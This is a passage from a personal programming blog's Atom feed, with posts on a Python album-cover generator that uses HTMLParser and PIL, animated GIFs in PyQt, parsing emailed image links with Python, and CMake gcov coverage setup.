&lt;p&gt;As above we create the URL, parse the output with minidom and fetch our page title. Done.&lt;/p&gt;
&lt;p&gt;Album title is a little trickier. I couldn't find a decent quote page that offered a free, easy to use API, so I decided to be a little more hacky and just parse the HTML itself. Hey, it works, don't judge me. We need a helper class for this called &lt;cite&gt;MyHTMLParser&lt;/cite&gt; that derives from python's &lt;a class="reference external" href="http://docs.python.org/2/library/htmlparser.html?highlight=htmlparser#HTMLParser"&gt;HTMLParser&lt;/a&gt; class.&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyHTMLParser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HTMLParser&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;HTMLParser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quotes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handle_starttag&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tag&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;attrs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;tag&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;dt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;attrs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'class'&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;attrs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'quote'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handle_endtag&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handle_data&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quotes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;getAlbumTitle&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;random_quote_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://www.quotationspage.com/random.php3&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random_quote_url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MyHTMLParser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;num_quotes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quotes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;quote&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quotes&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;num_quotes&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'.'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;last_set&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;words&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;quote&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;last_set&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;words&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;last_set&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;words&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;words&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;last_set&lt;/span&gt;&lt;span class="p"&gt;:])&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The class here is used to parse the HTML from &lt;a class="reference external" href="http://www.quotationspage.com/random.php3"&gt;http://www.quotationspage.com/random.php3&lt;/a&gt;, specifically the tag that starts with &lt;cite&gt;quote&lt;/cite&gt;. Once we have that we start capturing the data between that tag and store it in an array. Our &lt;cite&gt;getAlbumTitle&lt;/cite&gt; function will use this data to select a random quote and then get the last 3 or 5 words from it and join them with spaces before returning that new string.&lt;/p&gt;
&lt;p&gt;So now we have the data that we need, we just need to wrap it all up and generate our final image using &lt;code&gt;PIL&lt;/code&gt;. Surprise, surprise, this isn't a big deal either.&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;band_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getBandName&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;album_title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getAlbumTitle&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;cover&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getAlbumImage&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;PIL&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ImageFont&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;PIL&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;PIL&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ImageDraw&lt;/span&gt;

    &lt;span class="n"&gt;fnt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ImageFont&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;truetype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/share/fonts/dejavu/DejaVuSans.ttf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;lineWidth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;
    &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;band.jpg&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;imagebg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'RGBA'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;#000000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# make an entirely black image&lt;/span&gt;
    &lt;span class="n"&gt;mask&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'L'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#000000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;       &lt;span class="c1"&gt;# make a mask that masks out all&lt;/span&gt;
    &lt;span class="n"&gt;draw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ImageDraw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Draw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                     &lt;span class="c1"&gt;# setup to draw on the main image&lt;/span&gt;
    &lt;span class="n"&gt;drawmask&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ImageDraw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Draw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mask&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                &lt;span class="c1"&gt;# setup to draw on the mask&lt;/span&gt;
    &lt;span class="n"&gt;drawmask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;lineWidth&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="n"&gt;lineWidth&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                  &lt;span class="n"&gt;fill&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#999999&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;        &lt;span class="c1"&gt;# draw a line on the mask to allow some bg through&lt;/span&gt;
    &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;paste&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;imagebg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mask&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mask&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                    &lt;span class="c1"&gt;# put the (somewhat) transparent bg on the main&lt;/span&gt;
    &lt;span class="n"&gt;draw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;band_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;font&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;fnt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fill&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#ffffff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;      &lt;span class="c1"&gt;# add some text to the main&lt;/span&gt;
    &lt;span class="n"&gt;draw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;album_title&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;font&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;fnt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fill&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#ffffff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;      &lt;span class="c1"&gt;# add some text to the main&lt;/span&gt;
    &lt;span class="k"&gt;del&lt;/span&gt; &lt;span class="n"&gt;draw&lt;/span&gt;
    &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;out.jpg&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;JPEG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;quality&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Let's go over what's happening here. You're welcome to clean it up as an exercise if you wish or think some values (like filenames) etc need configuring. Firstly we call the previously defined functions to fetch our album data and then we start the drawing. I use the &lt;code&gt;DejaVuSans.ttf&lt;/code&gt; font for this example, but you can use any font you have, or even use different fonts for the title and band name, to make your cover look a bit more pleasing. Once the image we saved from Flickr is open, we start writing our title and band name on the album cover, and save out the result as a &lt;code&gt;JPEG&lt;/code&gt;. The code here is commented so I won't go over the details here.&lt;/p&gt;
&lt;p&gt;And that's all there is to it. If you want the the script as a whole file, you can &lt;a class="reference external" href="https://gist.github.com/4025200"&gt;get it from this gist&lt;/a&gt;&lt;/p&gt;
</summary></entry><entry><title>Show animated gifs using PyQT</title><link href="http://unlogic.co.uk/2012/11/02/show-animated-gifs-using-pyqt/" rel="alternate"></link><updated>2012-11-02T00:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2012-11-02:2012/11/02/show-animated-gifs-using-pyqt/</id><summary type="html">&lt;p&gt;This is just a quick post to show you how to display animated gifs in PyQt. It's a straightforward process and by the end I will give you a class that wraps up the work for you.&lt;/p&gt;
&lt;p&gt;The way we're going to approach this is by using a &lt;code&gt;QLabel&lt;/code&gt; to render a &lt;code&gt;QMovie&lt;/code&gt;. Assuming we have our gif (&lt;code&gt;anim.gif&lt;/code&gt;) we need to load it into a &lt;code&gt;QMovie&lt;/code&gt; and set it on the &lt;code&gt;QLabel&lt;/code&gt;.
I'll give you the code now:&lt;/p&gt;
&lt;script src="https://gist.github.com/Svenito/4000025.js"&gt;&lt;/script&gt;&lt;p&gt;The code should be fairly easy to follow, so I won't spend much time here going over it. If you want to call this from a &lt;code&gt;__main__&lt;/code&gt; function you simply do:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;gif&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/path/to/image.gif&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;QApplication&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;player&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ImagePlayer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gif&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;player&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exec_&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;
</summary></entry><entry><title>Parsing email in python</title><link href="http://unlogic.co.uk/2012/10/11/parsing-email-in-python/" rel="alternate"></link><updated>2012-10-11T00:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2012-10-11:2012/10/11/parsing-email-in-python/</id><summary type="html">&lt;p&gt;I have a domain where I host images. It's nothing fancy, just a collection where gifs and generally humerous images get stored in a custom gallery script.
I also have a script on my host that I can pass a URL to and it will get the image with wget, put it in the right directory and then curl the import URL for the gallery. So if you've ever wanted to parse email addresses for content via a script, read on. Example code inside.&lt;/p&gt;
&lt;p&gt;Now this in principle is great, but sometimes I need to add an image from my phone and the whole ssh thing becomes a bit cumbersome. Usually I'll see something in Reeder or some other iPhone app which allows me to email the URL. Perfect. So I wrote a quick script that would do the work for me, and set up an email address that passes any content to this script. The script in question is here:&lt;/p&gt;
&lt;script src="https://gist.github.com/Svenito/3872497.js"&gt;&lt;/script&gt;&lt;p&gt;I use the &lt;code&gt;fileinput&lt;/code&gt; module to read the data from stdin and then join it all to a single text chunk. I'm not expecting too much data in the email, so this isn't a big issue. Then I extract the message via the &lt;code&gt;email&lt;/code&gt; module and parse the payload in order to get the actual email body, discarding the headers and all the other things I don't need. Assuming people have good etiquette and have the correct signature separator (&lt;code&gt;-- \n&lt;/code&gt;), I also strip off the signature.
Once I have the body I extract the image URL(s) using regular expressions, and then pass the URL to my import script.&lt;/p&gt;
&lt;p&gt;As you can see this only works with image URLs that are prefixed with &lt;code&gt;http://&lt;/code&gt;. The email address is a random collection of letters and numbers to reduce the likelyhood of just anyone emailling links.&lt;/p&gt;
</summary></entry><entry><title>cmake and gcov</title><link href="http://unlogic.co.uk/2012/08/13/cmake-and-gcov/" rel="alternate"></link><updated>2012-08-13T00:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2012-08-13:2012/08/13/cmake-and-gcov/</id><summary type="html">&lt;p&gt;Recently I setup a project that uses CMake as its build tool and &lt;a class="reference external" href="https://code.google.com/p/googletest/"&gt;googletest&lt;/a&gt; as a unit test framework. As is common place I wanted to make sure that my tests cover as much of the code as possible, so I went and grabbed the trusty gcov/lcov to analyse the tests only to find it wasn't as easy as I expected. I should mention this is the first time I have used CMake aswell as googletest. Granted, googletest is fairly simple and doesn't really complicate things when it comes to getting code coverage. I just had to figure out how we get CMake to build the test runner properly and then how to invoke lcov correctly. Turns out this was fairly easy too, once you ironed out some of the trickier bits and learned a little more about CMake.&lt;/p&gt;
&lt;p&gt;In the &lt;code&gt;CMakeLists.txt&lt;/code&gt; file for your test suite you need to add the following (I've omitted some lines that aren't relevant to this article):&lt;/p&gt;
&lt;pre class="code cmake literal-block"&gt;
&lt;span class="nb"&gt;SET&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;PROJECT_TEST_NAME&lt;/span&gt; &lt;span class="o"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PROJECT_NAME_STR&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="s"&gt;_test&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nb"&gt;SET&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;CMAKE_CXX_FLAGS&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-g -O0 -Wall -fprofile-arcs -ftest-coverage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;SET&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;CMAKE_C_FLAGS&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-g -O0 -Wall -W -fprofile-arcs -ftest-coverage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;SET&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;CMAKE_EXE_LINKER_FLAGS&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-fprofile-arcs -ftest-coverage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="err"&gt;.&lt;/span&gt;
&lt;span class="err"&gt;.&lt;/span&gt;
&lt;span class="err"&gt;.&lt;/span&gt;

&lt;span class="nb"&gt;target_link_libraries&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PROJECT_TEST_NAME&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;gtest_main&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;gtest&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;pthread&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
